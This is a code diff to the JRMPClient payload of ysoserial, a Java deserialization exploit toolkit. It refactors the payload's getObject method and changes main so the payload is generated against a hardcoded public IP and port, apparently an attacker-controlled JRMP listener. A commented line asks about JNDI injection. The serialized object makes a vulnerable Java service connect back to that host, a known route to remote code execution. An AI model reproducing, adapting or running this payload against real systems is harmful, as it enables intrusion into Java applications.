@@ -14,6 +14,8 @@ import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
+import javax.management.remote.rmi.RMIConnectionImpl_Stub;
+
 
 /**
  *
@@ -53,8 +55,12 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.MBECHLER })
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
-    public Registry getObject ( final String command ) throws Exception {
+    @Override
+    public Registry getObject(String command) throws Exception {
+        return getObjectOld(command);
+    }
 
+    public Registry getObjectOld ( final String command ) throws Exception {
         String host;
         int port;
         int sep = command.indexOf(':');
@@ -76,9 +82,11 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
         return proxy;
     }
 
-
     public static void main ( final String[] args ) throws Exception {
         Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
-        PayloadRunner.run(JRMPClient.class, args);
+        //PayloadRunner.run(JRMPClient.class, args);
+        PayloadRunner.run(JRMPClient.class, new String[]{"39.106.143.48:9989"});
+        //PayloadRunner.run(JRMPClient.class, new String[]{"127.0.0.1:1097"}); //有lookup不? 可以JNDI注入? @angelwhu
     }
+
 }
